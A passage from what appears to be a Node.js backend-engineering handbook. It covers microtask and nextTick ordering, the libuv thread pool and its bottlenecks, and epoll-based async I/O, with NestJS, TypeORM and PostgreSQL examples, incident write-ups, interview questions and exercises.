Promises need "run this as soon as the current operation finishes, before anything else happens" so that async code has predictable ordering: a .then on a resolved promise always runs asynchronously (never inline), but always before the next I/O event. process.nextTick predates promises and exists for the same reason in Node's own APIs: to let an object finish constructing before it emits events, so that listeners attached right after new are not missed.

Mental model

Imagine finishing a phone call at a help desk. Before you pick up the next call from the queue (macrotask), you deal with the sticky notes you wrote during the call (microtasks): "email the customer the link", "update the ticket". If a sticky note says "write another sticky note", you do that too before picking up the phone. The queue of callers does not move until the notes are done. Write yourself an infinite chain of notes and nobody ever gets through.

How it works

  1. A macrotask callback runs to completion.
  2. Node runs processTicksAndRejections: pop and run every nextTick callback (including ones added meanwhile).
  3. Ask V8 to run all promise jobs (including ones added meanwhile).
  4. If steps 2 or 3 added new nextTicks, go back to step 2. Repeat until both queues are empty.
  5. Process unhandled promise rejections that were detected during the drain: by default since Node 15, an unhandled rejection is thrown as an uncaught exception, which terminates the process unless a process.on('unhandledRejection') handler exists.
  6. Only now does the loop pick the next macrotask.

A worked example with exact output:

process.nextTick(() => console.log('tick 1'));
Promise.resolve().then(() => {
  console.log('promise 1');
  process.nextTick(() => console.log('tick inside promise'));   // goes to the nextTick queue
});
process.nextTick(() => console.log('tick 2'));
Promise.resolve().then(() => console.log('promise 2'));
console.log('sync');
sync
tick 1
tick 2
promise 1
promise 2
tick inside promise

sync runs first. Then the nextTick queue drains (tick 1, tick 2). Then the promise queue drains (promise 1, which queues a new nextTick, then promise 2, which was already queued). The nextTick queue is now non-empty, so it drains again (tick inside promise). Only then would the loop proceed to the next macrotask.

How await fits: await x on a native promise costs one microtask hop before the continuation runs; the continuation runs in the drain, on an empty stack, before any I/O callback. An async function with three sequential awaits on already-resolved values completes within one drain and never touches the loop's phases.

Practical example

The three places microtask ordering matters in application code:

  • Emit after construction: an EventEmitter subclass that emits 'ready' in its constructor emits before the caller has attached a listener; process.nextTick(() => this.emit('ready')) defers just enough.
  • Batching within a tick: a data loader that collects every load(id) call made during one macrotask and issues one WHERE id IN (...) query. It schedules the flush with process.nextTick (or a microtask), so calls made synchronously and in the same promise chain coalesce. This is the mechanism behind dataloader and the N+1 fix in GraphQL resolvers.
  • Fire-and-forget safety: this.audit.record(event) without await or .catch is a background promise; a rejection there terminates the process at the end of some unrelated request's microtask drain.

NestJS example

An ID batcher for resolvers and services, coalescing all lookups requested in the same tick into one query:

// customers/customer-batch-loader.ts
import { Injectable, Scope } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { In, Repository } from 'typeorm';
import { Customer } from './customer.entity';

@Injectable({ scope: Scope.REQUEST })                 // one batcher per request: no cross-request data leaks
export class CustomerBatchLoader {
  private pending = new Map<number, { resolve: (c: Customer | null) => void; reject: (e: unknown) => void }[]>();
  private scheduled = false;

  constructor(@InjectRepository(Customer) private readonly customers: Repository<Customer>) {}

  load(id: number): Promise<Customer | null> {
    return new Promise((resolve, reject) => {
      const waiters = this.pending.get(id) ?? [];
      waiters.push({ resolve, reject });
      this.pending.set(id, waiters);
      if (!this.scheduled) {
        this.scheduled = true;
        process.nextTick(() => this.flush());        // runs after the current sync code and all loads queued with it
      }
    });
  }

  private async flush() {
    const batch = this.pending;
    this.pending = new Map();
    this.scheduled = false;
    try {
      const rows = await this.customers.findBy({ id: In([...batch.keys()]) });   // one query for N ids
      const byId = new Map(rows.map((r) => [r.id, r]));
      for (const [id, waiters] of batch) for (const w of waiters) w.resolve(byId.get(id) ?? null);
    } catch (err) {
      for (const waiters of batch.values()) for (const w of waiters) w.reject(err);
    }
  }
}

Fifty loader.load(id) calls made while mapping fifty order lines become one SELECT ... WHERE id IN (...). Note the request scope: a singleton batcher would merge lookups from different users' requests, which is a correctness and privacy bug.

And the safety net for fire-and-forget work, registered once in main.ts:

process.on('unhandledRejection', (reason) => {
  // Log with full context, then exit: the process state is unknown after an unhandled rejection
  logger.error({ err: reason }, 'unhandled promise rejection');
  process.exitCode = 1;
  setTimeout(() => process.exit(1), 1_000).unref();   // give the logger a moment to flush
});

The right long-term fix is never to have background promises without .catch, but this handler turns a silent crash into a logged one.

Production scenario

A GraphQL gateway resolving orders { customer { name } } for 100 orders issued 100 customer queries per request: 100 × 2 ms = 200 ms of database time and 100 pool acquisitions. With the tick-batched loader it issues one query in 4 ms. The mechanism is nothing but the microtask drain: every resolver's load() runs in the same drain, the flush is queued once, and it runs after all of them. Same code shape scales to any "N small lookups triggered by one event" pattern: notification fan-out, permission checks, price lookups.

Failure scenario

At 11:30 a queue consumer stopped consuming but showed 100% CPU. It polled a local in-memory buffer with async function pump() { const item = await buffer.take(); handle(item); pump(); }. buffer.take() returned an already-resolved promise when the buffer was empty (a bug: it resolved undefined instead of waiting). The result was an infinite chain of microtasks: await (one hop), pump() again, await, forever, with the loop never reaching the poll phase to receive new messages from the broker or answer the health check. The process looked busy and alive, and it was doing nothing. Fix: make take() return a promise that resolves only when an item exists, and put an await setImmediate() in the loop as a guard so that even a bug like this yields to I/O.

Edge cases & failure modes

  • nextTick runs before promises; libraries that assume promise-ordering can be surprised by Node-specific nextTick users. Prefer queueMicrotask in shared code.
  • An exception thrown inside a nextTick callback is an uncaught exception, not a rejected promise; it takes the process down unless process.on('uncaughtException') handles it.
  • Non-native thenables (objects with a then method) cost extra microtask hops when awaited; ORMs and drivers that return custom thenables can add ordering surprises.
  • Long microtask chains (thousands of .thens created in one macrotask) are indistinguishable from a blocked loop to every other request.
  • await inside try/catch catches rejections; a promise created before the try and awaited inside it still catches, but a promise that rejects before being awaited registers as unhandled briefly; Node only reports it if it is still unhandled at the end of the drain, so the common pattern is safe.
  • Request-scoped providers in NestJS (as in the loader) make the whole injection subtree request-scoped, with a per-request instantiation cost; measure before using them widely.

How a Senior Backend Engineer thinks about this

They use microtask ordering deliberately in two idioms, batching and emit-after-construct, and avoid it everywhere else. They treat every background promise as a liability that needs a .catch and a metric. They assume any loop of awaits over local data will starve I/O and insert a real yield. To a product manager: "Between handling two customers, the agent clears a small pile of follow-up notes; we make sure the pile is small and never self-replenishing."

Common mistakes

  • Fire-and-forget promises without .catch.
  • Emitting events in constructors.
  • Recursive polling with always-resolved promises.
  • Using process.nextTick in library code intended to run in browsers or other runtimes.
  • A singleton batcher that merges data across requests.

Interview questions

  1. In what order do process.nextTick and Promise.then callbacks run, and what happens if a promise callback queues a nextTick? Expected: nextTick queue first, then promises, then back to nextTick; show the six-line example.
  2. What is an unhandled rejection, when is it detected, and what does Node do by default? Expected: a rejected promise with no handler at the end of the microtask drain; since Node 15 it throws and terminates the process.
  3. How does a dataloader turn N+1 queries into one, in event-loop terms? Expected: all loads in one macrotask register in a map; a nextTick/microtask flush runs once after them with WHERE id IN.
  4. Why must such a loader be request-scoped in a web server? Expected: a singleton would batch and cache across users' requests.
  5. Describe a microtask starvation bug you could write by accident. Expected: a recursive async pump awaiting an already-resolved promise; fix with a real yield.

Practical exercise

Implement CustomerBatchLoader, wire it into a resolver or service that looks up 100 customers, and count queries with pg_stat_statements before and after. Then write the always-resolved pump bug, observe the health check fail, and fix it.

Acceptance criteria: query count drops from ~100 to 1 per request; the six-line ordering example prints in the documented order; the pump bug is reproduced and fixed with a one-line await setImmediate() guard plus the real fix in take().

9.18 libuv and the thread pool

Concept

libuv is the C library that gives Node.js its asynchronous behaviour. V8 (3.14) runs JavaScript; libuv does everything else: it owns the event loop (9.16), it talks to the kernel's readiness notification mechanism (epoll on Linux, kqueue on macOS/BSD, IOCP on Windows), it manages timers, TCP and UDP sockets, pipes, signals, child processes, DNS, and it owns a small pool of real operating-system threads for the work that the kernel cannot do asynchronously.

That last part is the piece most engineers get wrong. Node is often described as "single-threaded", and the JavaScript is. But a Node process at rest already has more than one thread: the main thread running V8 and the loop, four libuv thread-pool threads, and several V8 helper threads for garbage collection and JIT compilation. Run ps -T -p <pid> on a plain node -e "setInterval(()=>{},1000)" and you will typically see 7 to 11 threads.

The thread pool has four threads by default, sized by the UV_THREADPOOL_SIZE environment variable, with a maximum of 1024. It exists because some kernel operations have no usable asynchronous interface. Reading a file on Linux, for example, has no good readiness model: a regular file is always "ready" as far as epoll is concerned, even when the read will block for 8 ms on a spinning disk or a slow NFS mount. So libuv hands file operations to a thread, that thread performs a blocking pread(), and when it finishes it pushes a completion back to the loop.

Why does it exist?

Without the pool, fs.readFile would have to block the main thread, and one slow disk read would freeze every request in the process. With the pool, the main thread stays free; the cost is that the pool is a fixed, shared, four-slot resource for the entire process, and anything that occupies a slot for a long time makes everything else that needs the pool queue behind it.

This is the single most under-appreciated bottleneck in production Node. It is invisible in CPU graphs, invisible in event-loop lag, and invisible in database metrics. It shows up only as latency.

Mental model

Imagine a restaurant with one waiter (the main thread) and four cooks in the kitchen (the pool). The waiter is fast: he takes orders, carries plates, and never stands still. Anything the customer asks for that the waiter can just hand over from the counter (a bottle of water, a bill) he does himself instantly. Anything that needs cooking goes to the kitchen, and there are only four cooks. If five customers order a dish that takes 90 seconds, the fifth waits 90 seconds before a cook is even free. The waiter is not the bottleneck; the kitchen is. And you cannot see the kitchen from the dining room.

How it works

flowchart LR
    JS["JavaScript on the main thread"] --> UV["libuv"]
    UV -->|"fs, dns.lookup, crypto pbkdf2, zlib"| Q["work queue"]
    Q --> T1["pool thread 1"]
    Q --> T2["pool thread 2"]
    Q --> T3["pool thread 3"]
    Q --> T4["pool thread 4"]
    T1 --> DONE["completion queue"]
    T2 --> DONE
    T3 --> DONE
    T4 --> DONE
    UV -->|"TCP, UDP, pipes, dns.resolve"| EP["epoll / kqueue / IOCP"]
    EP --> POLL["poll phase"]
    DONE --> POLL
    POLL --> JS
  1. You call fs.readFile('/data/invoice.pdf', cb).
  2. libuv creates a uv_work_t request and pushes it onto the global work queue.
  3. If a pool thread is idle it picks the item up; otherwise the item waits in FIFO order.
  4. The pool thread calls the blocking syscall (open, pread, close). This thread blocks; the main thread does not.
  5. When the syscall returns, the thread writes the result into the request and signals the loop by writing a byte to an internal uv_async pipe. That write makes epoll_wait return.
  6. In the poll phase of the next loop turn, libuv drains its completion queue and invokes your JavaScript callback on the main thread.
  7. Microtasks drain, and the loop moves on.

Step 3 is the whole story. There are four slots. FIFO. Process-wide.

The definitive table: what uses the pool and what does not

Operation Where it runs Notes
fs.readFile, fs.writeFile, fs.stat, fs.readdir, fs.open, all async fs.* libuv thread pool Every file operation, including the ones your logger does
fs.createReadStream / createWriteStream libuv thread pool Each chunk read is a pool task
dns.lookup (and therefore every http.request to a hostname by default) libuv thread pool Wraps the blocking getaddrinfo(3)
crypto.pbkdf2, crypto.scrypt, crypto.randomBytes, crypto.randomFill, crypto.generateKeyPair — async forms only libuv thread pool The sync forms run on the main thread and block the loop
zlib.gzip, gunzip, deflate, brotliCompress — async forms libuv thread pool Response compression at high RPS is a real pool consumer
Most native addons using napi_create_async_work (bcrypt, argon2, sharp, libpq async helpers) libuv thread pool This is why bcrypt competes with your logger
TCP sockets: net, http, https, http2 server and client OS async I/O (epoll/kqueue/IOCP) No thread. 10,000 sockets cost 10,000 file descriptors and no threads
UDP: dgram OS async I/O
dns.resolve* (resolve4, resolveMx, ...) OS async I/O Uses c-ares, which speaks DNS over UDP/TCP sockets directly
Child process stdio pipes, child_process spawn/exec OS async I/O The child is a separate process with its own threads
Signals (SIGTERM) and process.nextTick main thread
TLS handshake crypto (tls) main thread Asymmetric crypto during handshakes is CPU on the main thread
Timers, setImmediate main thread

Two lines deserve emphasis. dns.lookup uses the pool. If your service calls three HTTP APIs by hostname and DNS is slow, you are consuming pool slots on every request unless you keep a DNS cache or use dns.resolve. And crypto.randomBytes async uses the pool — generating 100 idempotency keys per second is fine; generating a 1 MB random buffer per request is not.

Practical example

Prove the four-slot limit in ten lines:

// pool-demo.ts - run: node pool-demo.js   then: UV_THREADPOOL_SIZE=8 node pool-demo.js
import { pbkdf2 } from 'node:crypto';
const start = Date.now();

for (let i = 0; i < 8; i++) {
  // ~200 ms of CPU each, on a pool thread
  pbkdf2('password', 'salt', 300_000, 64, 'sha512', () => {
    console.log(`task ${i} done at ${Date.now() - start} ms`);
  });
}

With the default pool on a 4-core machine you see roughly 200, 200, 200, 200, 400, 400, 400, 400. Tasks 4 to 7 waited for a free thread. With UV_THREADPOOL_SIZE=8 on a 4-core machine you see roughly 400 for all eight: the work is now competing for cores, not threads. That is the crucial second lesson — raising UV_THREADPOOL_SIZE above your CPU count does not create CPU, it only reorders the queueing.

NestJS example

A password service that measures its own pool wait, so the bottleneck is visible in metrics instead of being guessed at during an incident:

// auth/password.service.ts
import { Injectable, Logger } from '@nestjs/common';
import { scrypt as scryptCb, randomBytes, timingSafeEqual } from 'node:crypto';
import { promisify } from 'node:util';
import { Histogram } from 'prom-client';

const scrypt = promisify(scryptCb) as (p: string, s: Buffer, k: number) => Promise<Buffer>;

@Injectable()
export class PasswordService {
  private readonly logger = new Logger(PasswordService.name);
  private readonly hashDuration = new Histogram({
    name: 'password_hash_duration_seconds',
    help: 'Wall time of a password hash, including libuv pool queueing',
    buckets: [0.05, 0.1, 0.2, 0.4, 0.8, 1.6, 3.2],
  });

  async hash(plain: string): Promise<string> {
    const end = this.hashDuration.startTimer();
    const salt = randomBytes(16);                       // pool task, sub-millisecond
    const key = await scrypt(plain, salt, 64);          // pool task, ~120 ms of CPU
    const seconds = end();
    // Wall time far above the CPU cost means we queued behind other pool work.
    if (seconds > 0.5) this.logger.warn(`password hash took ${(seconds * 1000).toFixed(0)} ms - libuv pool contention?`);
    return `scrypt$${salt.toString('base64')}$${key.toString('base64')}`;
  }

  async verify(plain: string, stored: string): Promise<boolean> {
    const [, saltB64, keyB64] = stored.split('$');
    const key = await scrypt(plain, Buffer.from(saltB64, 'base64'), 64);
    return timingSafeEqual(key, Buffer.from(keyB64, 'base64'));   // constant time, main thread, microseconds
  }
}

Set the pool size once, before anything reads it, in the container spec rather than in code — libuv reads UV_THREADPOOL_SIZE when the pool is first used, so process.env.UV_THREADPOOL_SIZE = '8' at the top of main.ts sometimes works and sometimes does not, depending on what ran first.

# deployment.yaml
env:
  - name: UV_THREADPOOL_SIZE
    value: "8"        # 1 vCPU pod doing bcrypt: raise cautiously and measure

PostgreSQL example

The pg driver is pure JavaScript over a TCP socket, so PostgreSQL queries do not use the thread pool. They use epoll like any other socket. That is why a Node process can hold a pool of 20 database connections and 5,000 HTTP connections on 1 vCPU without threads exploding.

But there are two exceptions worth knowing:

  • pg-native (libpq bindings) does use the libuv pool for query execution. Using pg-native for "speed" on a service that also hashes passwords means your queries and your hashes fight over four threads. Almost nobody should use pg-native today.
  • Connecting to db.internal.example.com triggers dns.lookup, which is a pool task. During a DNS outage, connection attempts pin pool threads for the resolver timeout (often 5 s), and your fs logging stalls with them.
-- The database side sees nothing unusual during pool starvation:
SELECT query, calls, round(mean_exec_time::numeric, 2) AS mean_ms
FROM pg_stat_statements
ORDER BY total_exec_time DESC LIMIT 5;
--  query                            | calls  | mean_ms
--  SELECT * FROM users WHERE email=$1| 412000 |    1.90
-- 1.9 ms in the database while the application reports p99 of 3,100 ms is the signature
-- of a runtime problem, not a query problem.

TypeORM example

TypeORM adds no threads of its own; it sits on pg. The one place it touches the pool is migrations and entity loading, which read files from disk at boot:

// data-source.ts
export const AppDataSource = new DataSource({
  type: 'postgres',
  url: process.env.DATABASE_URL,
  entities: [Order, OrderItem, Customer],     // explicit classes: no glob, no fs scan at boot
  migrations: ['dist/migrations/*.js'],       // globs here are fine, they run once
  poolSize: 20,
});

Prefer explicit entity classes over glob patterns ('dist/**/*.entity.js'). Globs make TypeORM walk the filesystem at startup, which is thousands of pool tasks and adds hundreds of milliseconds to cold start in a container with a slow overlay filesystem.

Production scenario

A retail checkout service runs on 6 pods, 2 vCPU each, serving 900 requests per second. Ninety percent of requests are reads that never touch the pool. The remaining ten percent generate a PDF receipt, which reads a template file (fs, pool), compresses the output (zlib, pool) and uploads it. At 90 receipts per second with roughly 25 ms of pool work each, the pool is about 56% utilised on 4 threads. Fine.

Then marketing enables gzip response compression in Node for all responses instead of at the ingress. Suddenly every one of 900 requests per second per pod needs a zlib.gzip pool task of about 1.5 ms. Pool demand goes from 2.25 thread-seconds per second to over 3.5. Queueing begins, the receipt path's p99 goes from 60 ms to 900 ms, and the fix is a one-line ingress change: compress at nginx/Envoy, not in Node.

Failure scenario

The bcrypt incident. At 09:05 on the morning of a campaign launch, the login endpoint's p99 went from 220 ms to 3.1 seconds. CPU was 60%. Event-loop lag was 4 ms — healthy. PostgreSQL mean execution time for the login query was 1.9 ms. Every dashboard said the system was fine, and every customer said login was broken.

The login flow called bcrypt.hash (the async, native-addon form, which uses the libuv pool) at cost factor 12, about 250 ms of CPU per call. Traffic had risen to 20 logins per second per pod. Twenty concurrent hashes, four pool threads: at any instant, sixteen of them were queued. Little's law gives the answer immediately — 20 arrivals per second at 0.25 s of service time needs 5 servers' worth of capacity, and there were 4. The queue grew without bound until arrivals dropped.

Worse, fs writes from the logger and dns.lookup for the payment API were queued behind the hashes, so unrelated calls slowed down too. The classic five-concurrent-hashes demonstration is exactly this: five bcrypt.hash calls issued at the same moment complete at roughly 250 ms for the first four and 500 ms for the fifth, and it scales linearly from there.

The mitigations, in the order they were applied:

  1. UV_THREADPOOL_SIZE=8 — bought 30 minutes; p99 fell to 1.4 s but the pods were now CPU-saturated because there was still only 2 vCPU of actual compute.
  2. Scaled from 6 pods to 14 — restored p99 to 300 ms. Expensive, but immediate.
  3. The real fix, shipped that afternoon: move hashing to a dedicated worker-thread pool with piscina (9.20) sized to the CPU count, add a per-IP rate limit on login, and keep the cost factor at 12 while measuring hash time as a first-class metric.

The lesson: password hashing capacity is a capacity-planning number, not an implementation detail. At cost factor 12 and 250 ms per hash, a 2 vCPU pod can hash at most about 8 passwords per second, whatever you set UV_THREADPOOL_SIZE to.

Edge cases & failure modes

  • UV_THREADPOOL_SIZE is read once, when the pool is first used. Setting it in code after any fs call has already happened silently does nothing.
  • The pool is process-wide, shared by every library, including your logger, your metrics client and your ORM's file loading. There is no per-caller isolation and no priority.
  • Raising the pool size above the CPU count converts thread-queueing into CPU-queueing plus more context switches (9.2). Past roughly 2 x vCPU it usually makes things worse.
  • Each pool thread has its own stack (default 8 MB virtual, a few hundred KB resident). UV_THREADPOOL_SIZE=128 in a 512 MiB container is a real memory cost and an OOMKilled risk.
  • Sync APIs never use the pool. fs.readFileSync, crypto.pbkdf2Sync and zlib.gzipSync run on the main thread and block the event loop for every request in the process.
  • A native addon that blocks forever inside a pool thread permanently removes a slot. There is no timeout and no cancellation for uv_queue_work.
  • In Kubernetes with a CPU limit of 1, the CFS quota (9.2) is shared by all threads. Four pool threads plus the main thread plus GC threads can burn the quota in 25 ms of a 100 ms period and then be throttled for 75 ms, producing latency spikes that look exactly like GC pauses.
  • dns.lookup results are not cached by Node. A hot loop of outbound HTTP calls to a hostname is a hot loop of pool tasks; use an agent with keepAlive: true and a DNS cache.

How a Senior Backend Engineer thinks about this

They classify every operation before they write it: main thread, pool, socket, or worker? They treat the four pool threads as a shared, unprioritised, uncancellable queue and refuse to put unbounded or long work on it. They know that UV_THREADPOOL_SIZE is a mitigation, not a fix, because it does not create CPU. When latency rises with healthy loop lag and healthy database metrics, the pool is their second hypothesis (after downstream latency) rather than their tenth.

To a product manager: "Node has one waiter and four cooks. Login needs a cook for a quarter of a second. Twenty logins a second needs five cooks. We either hire cooks (more pods) or make the dish faster."

Common mistakes

  • Believing Node is "single-threaded" and therefore that fs and crypto are free.
  • Setting UV_THREADPOOL_SIZE=128 as a cargo-cult fix and then being OOMKilled or CPU-throttled.
  • Using bcrypt.hashSync in an HTTP handler, which is strictly worse: it blocks the loop instead of a pool thread.
  • Gzipping responses in Node when a reverse proxy is already in the path.
  • Using pg-native for a marginal parsing speedup and moving all queries onto the pool.
  • Loading TypeORM entities by glob in production images.

Interview questions

  1. Is Node.js single-threaded? Expected: JavaScript executes on one thread; the process has a libuv pool of 4 threads plus V8 helper threads; I/O is mostly kernel-async with no threads at all.
  2. Which Node APIs use the libuv thread pool? Expected: fs.*, dns.lookup, async crypto KDFs and randomBytes, zlib, and native addons using async work. Follow-up: which do not? TCP/UDP sockets, dns.resolve, child process pipes.
  3. Five concurrent bcrypt.hash calls at 250 ms each. When does the fifth finish, and why? Expected: about 500 ms; four pool threads, FIFO queue. Follow-up: what does UV_THREADPOOL_SIZE=8 change on a 2-core box? Little, because CPU becomes the constraint.
  4. Latency is up, loop lag is 3 ms, CPU is 55%, database mean time is 2 ms. What do you check? Expected: downstream dependency latency, then libuv pool saturation, then connection pool waits.
  5. Why does dns.lookup matter for a service that only talks to HTTP APIs? Expected: it is a pool task per connection unless cached or replaced by dns.resolve; a DNS outage pins threads for the resolver timeout.
  6. When would you raise UV_THREADPOOL_SIZE, and to what? Expected: when profiling shows pool queueing with idle CPU (I/O-bound pool work like slow network filesystems); roughly to 2 x vCPU, never blindly.

Practical exercise

Write a service with two endpoints: GET /ping returning { ok: true } immediately, and POST /hash doing crypto.scrypt with a cost tuned to about 200 ms. Load /hash at 4, 8, 16 and 32 concurrent requests with autocannon and record p50/p99 for both endpoints at each level. Then repeat with UV_THREADPOOL_SIZE=8 and again with the hashing moved into a piscina worker pool.

Acceptance criteria: a table of nine measurements showing that /hash p99 grows linearly with concurrency past 4 in the default configuration; a demonstration that /ping stays fast in all pool configurations but degrades if you switch to scryptSync; and a one-paragraph explanation of why the worker-pool version behaves differently from the raised-pool-size version.

9.19 Async I/O: epoll, kqueue and IOCP

Concept

For sockets, Node does not use threads at all. It asks the kernel a single question — "which of these 10,000 file descriptors can I read from or write to right now?" — and the kernel answers in one syscall. That mechanism is epoll on Linux, kqueue on macOS and BSD, IOCP on Windows, and event ports on Solaris. libuv hides the differences behind one API.

There are two families of design:

  • Readiness model (epoll, kqueue): the kernel tells you "fd 42 is now readable". You then perform the read() yourself, and it returns immediately because data is waiting in the socket buffer.
  • Completion model (IOCP, and Linux's newer io_uring): you tell the kernel "read 4 KB from fd 42 into this buffer and tell me when it is done". The kernel performs the copy and notifies you afterwards.

libuv normalises both into a completion-style callback API, which is why your JavaScript looks identical on every platform.

Why does it exist?

The naive way to serve many connections is one thread per connection. That works to a few thousand and then collapses: each thread needs a stack (default 8 MB of virtual address space, and real memory as it is touched), the scheduler must consider every runnable thread (9.2), and each context switch costs 1 to 5 microseconds plus cache and TLB pollution. Ten thousand mostly-idle threads means a scheduler run queue full of threads that have nothing to do, and gigabytes of stacks.

The older polling syscalls, select and poll, avoid the threads but scale badly for a different reason: you pass the entire set of descriptors on every call and the kernel walks all of them, so cost is O(n) per call even when only one is ready. select is additionally capped at FD_SETSIZE, typically 1024.

epoll fixes the algorithmic problem. You register interest once (epoll_ctl), and when the kernel's network stack marks a socket readable it moves that socket onto a ready list. epoll_wait returns only the ready ones: O(ready), not O(registered). This is the mechanical reason a single Node process can hold 50,000 idle WebSocket connections comfortably.

Mental model

Imagine a hotel with 10,000 rooms. The thread-per-connection design hires 10,000 receptionists, one standing outside each door, waiting. Almost all of them are doing nothing, but you pay them all and they crowd the corridors.

select/poll is one receptionist who walks the entire corridor every few seconds knocking on all 10,000 doors to ask "do you need anything?" — thorough, and slower the bigger the hotel.

epoll is a call-button system. Each room has a button wired to a single panel at the desk. One receptionist watches the panel. When three lights come on, she handles exactly those three rooms. Ten thousand silent rooms cost her nothing at all: the panel is dark. This is why 10,000 idle connections in Node are nearly free, and 10,000 threads are not.

How it works

sequenceDiagram
    participant NIC as NetworkCard
    participant K as Kernel
    participant UV as libuv
    participant JS as JavaScript
    NIC->>K: packet arrives, DMA into memory, interrupt
    K->>K: TCP stack reassembles, appends to socket receive buffer
    K->>K: mark fd 42 readable, add to epoll ready list
    UV->>K: epoll_wait with timeout = time to next timer
    K-->>UV: returns fd 42 is readable
    UV->>K: read 64 KB from fd 42
    K-->>UV: 1420 bytes copied
    UV->>JS: socket data callback with the Buffer
    JS->>JS: HTTP parser, route, controller

Step by step for an inbound HTTP request:

  1. The network card copies the frame into memory by DMA and raises an interrupt.
  2. The kernel's TCP/IP stack validates and reassembles the segment and appends the payload to that socket's receive buffer (sized by net.core.rmem_default and grown adaptively).
  3. The kernel marks the descriptor readable and, because your process registered interest in it, links it into the epoll instance's ready list. If a thread is blocked in epoll_wait on that instance, the kernel wakes it.
  4. libuv, blocked in epoll_wait with a timeout equal to the time until the nearest timer (9.16), returns with a list of ready descriptors.
  5. For each one, libuv calls read() into a reusable buffer and invokes the corresponding handle's callback. This is the poll phase.
  6. Node's HTTP parser (llhttp) consumes the bytes and, when it has a complete head, emits request into JavaScript.

Writes work in mirror image. socket.write(buf) calls write() immediately. If the kernel's send buffer has room, the bytes are copied in and write() returns the count — no event loop involvement at all. If the buffer is full (because the client is slow or the network is congested), write() returns EAGAIN, libuv keeps the remaining bytes in a queue, registers interest in writability for that descriptor, and returns false from socket.write(). That false is exactly the backpressure signal covered in 9.24. When the peer acknowledges data and space frees up, the kernel marks the descriptor writable, epoll_wait reports it, libuv flushes the queue, and Node emits 'drain'.

Readiness versus completion, and why it matters

Readiness (epoll, kqueue) Completion (IOCP, io_uring)
Kernel says "fd is ready, go read it" "your read is finished, here are the bytes"
Who copies the data Your process, after the notification The kernel, before the notification
Syscalls per operation 2 (wait + read) 1 (submit), plus batched completions
Works for regular files No — files are always "ready" Yes
Node exposure Linux/macOS sockets Windows sockets; files still use the pool on Linux

The "works for regular files" row is the reason 9.18 exists at all. A regular file's descriptor is always reported readable by epoll, even when the read will take 8 ms waiting on the disk, because the readiness model has no way to express "I will block on I/O but I am not a socket". So libuv falls back to real threads for files. On Windows, IOCP does handle files properly, which is why Node's file I/O behaves slightly differently there.

io_uring brings a completion model to Linux and would remove the need for the pool for file operations. libuv has experimental io_uring support for some file operations on recent kernels, but at the time of writing you should still plan capacity as if fs uses the pool.

Practical example

The concrete number that makes the model real. Hold 10,000 idle TCP connections open against a Node server:

// idle-connections.ts - a server that holds connections and reports its own cost
import { createServer } from 'node:net';
import { setInterval } from 'node:timers';

const sockets = new Set<import('node:net').Socket>();

createServer((socket) => {
  sockets.add(socket);
  socket.on('close', () => sockets.delete(socket));
}).listen(9000);

setInterval(() => {
  const { rss, heapUsed } = process.memoryUsage();
  console.log(`${sockets.size} sockets | rss ${(rss / 1e6).toFixed(0)} MB | heap ${(heapUsed / 1e6).toFixed(0)} MB`);
}, 5_000).unref();

Typical result on Linux with 10,000 idle connections: RSS around 250 to 400 MB, CPU essentially 0%. The cost is roughly 10 to 20 KB per connection in kernel socket buffers plus a few KB of JavaScript objects, and one file descriptor each. There is no thread per connection, so epoll_wait returns instantly with zero events and the process sleeps.

The same 10,000 connections with a thread each would need 10,000 stacks (even at a reduced 512 KB stack that is 5 GB of virtual memory and hundreds of MB resident), and the scheduler would have 10,000 threads to consider. This is the "C10K problem" and its solution in one paragraph.

NestJS example

Because idle connections are cheap but not free, the limits you must set are about descriptors and timeouts, not threads:

// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  const server = await app.listen(3000);

  // Every open connection is one file descriptor (3.5). Guard against descriptor exhaustion.
  server.maxConnections = 10_000;

  // Keep-alive must outlive the load balancer's idle timeout, or the LB will reuse
  // a connection Node is closing and clients see sporadic 502s.
  server.keepAliveTimeout = 65_000;   // ALB default idle timeout is 60 s
  server.headersTimeout = 66_000;     // must exceed keepAliveTimeout
  server.requestTimeout = 30_000;     // kill slowloris-style stalled request bodies
}
bootstrap();

And a health indicator that surfaces socket-level pressure, which no CPU metric will show you:

// health/sockets.health.ts
import { Injectable } from '@nestjs/common';
import { HealthIndicator, HealthIndicatorResult, HealthCheckError } from '@nestjs/terminus';

@Injectable()
export class SocketsHealthIndicator extends HealthIndicator {
  async isHealthy(key: string, max = 9_000): Promise<HealthIndicatorResult> {
    // Active handles include listening servers, sockets and timers held by libuv.
    const handles = (process as unknown as { _getActiveHandles(): unknown[] })._getActiveHandles().length;
    const requests = (process as unknown as { _getActiveRequests(): unknown[] })._getActiveRequests().length;
    const result = this.getStatus(key, handles < max, { handles, requests });
    if (handles >= max) throw new HealthCheckError('too many active handles', result);
    return result;
  }
}

Production scenario

A notifications service holds 45,000 WebSocket connections across 6 pods (7,500 each), pushing an average of 0.4 messages per connection per minute. Steady-state CPU per pod is 4%, RSS is 620 MB, and epoll_wait returns with a handful of events per call. The binding constraint is not CPU and not threads; it is the descriptor limit (ulimit -n, raised to 65,536) and the kernel memory for socket buffers.

The interesting failure mode is a thundering broadcast: a system-wide announcement to all 7,500 sockets in one pod means 7,500 socket.write() calls in a single event loop callback. Each write that fits in the send buffer is a syscall of a few microseconds; 7,500 of them is roughly 40 ms of blocked loop plus the serialization cost. The fix is to chunk the broadcast with await setImmediate() every 250 sockets (9.16) and to respect write() returning false (9.24).

Failure scenario

At 14:20 a payments API began returning 502s from the load balancer for roughly 0.3% of requests, in a pattern nobody could reproduce. Node's own logs showed no errors: from the application's point of view, those requests never arrived.

The cause was a race in the keep-alive lifecycle. Node's default server.keepAliveTimeout was 5 seconds; the AWS ALB's idle timeout was 60 seconds. The ALB kept pooled connections and reused them. When a connection had been idle for slightly more than 5 seconds, Node closed it. If the ALB dispatched a request onto that connection in the same instant, the request hit a socket that the kernel had already sent FIN on, and the ALB reported a 502 to the client.

The diagnosis came from ss -tan state time-wait | wc -l on the pod (unusually high) and a packet capture showing FIN from the server immediately before a request. The fix was one line — server.keepAliveTimeout = 65_000 with headersTimeout above it — a rule worth memorising: the server's keep-alive timeout must always be longer than the load balancer's idle timeout.

Edge cases & failure modes

  • Descriptor exhaustion. Every socket, every file, every pipe is an fd. Hitting the process limit gives EMFILE; accept() then fails and new connections are silently refused. Raise ulimit -n and fix the leak (9.5).
